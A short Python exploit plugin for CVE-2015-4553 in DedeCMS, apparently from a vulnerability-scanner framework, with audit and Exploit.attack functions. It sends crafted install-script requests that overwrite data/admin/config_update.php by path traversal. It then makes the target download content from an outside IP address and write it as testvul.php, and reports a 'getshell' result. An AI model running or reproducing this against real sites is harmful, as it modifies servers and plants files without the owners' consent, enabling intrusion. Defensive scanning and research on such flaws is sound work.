#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.expku.com/web/4955.html
#http://118.126.10.60/base-v57/是官网上的demodata不会消失
import requests

def assign(service, arg): 
    if service == "dedecms":
        return True, arg
		
def audit(arg): 
    url='/install/index.php'
    payload1='?step=11&insLockfile=utf-8&s_lang=urf-8&install_demo_name=../data/admin/config_update.php'
    payload2='?step=11&insLockfile=utf-8&s_lang=utf-8&install_demo_name=testvul.php&updateHost=http://118.126.10.60/base-v57/'
    testvul='/install/testvul.php'
    req = requests.get(arg+url+payload1, timeout=5)
    if req.status_code == 200 and '远程获取失败' in req.content:
        req2 = requests.get(arg+url+payload2, timeout=5)
        if req2.status_code == 200 and '存在(您可以选择安装进行体验)' in req2.content:
            req3 = requests.get(arg+testvul, timeout=5)
            if req3.status_code == 200 and 'INSERT INTO' in req3.content:
                return '[CVE-2015-4553]Dedecms variable coverage leads to getshell ' + arg + url
				
# if __name__ == '__main__': 
#     from dummy import *
#     audit(assign('dedecms', 'http://localhost:8080/DedeCMS-V5.7-UTF8-SP1-Full/uploads/')[1])

class Exploit(object):

    def attack(self, url):
        return audit(url)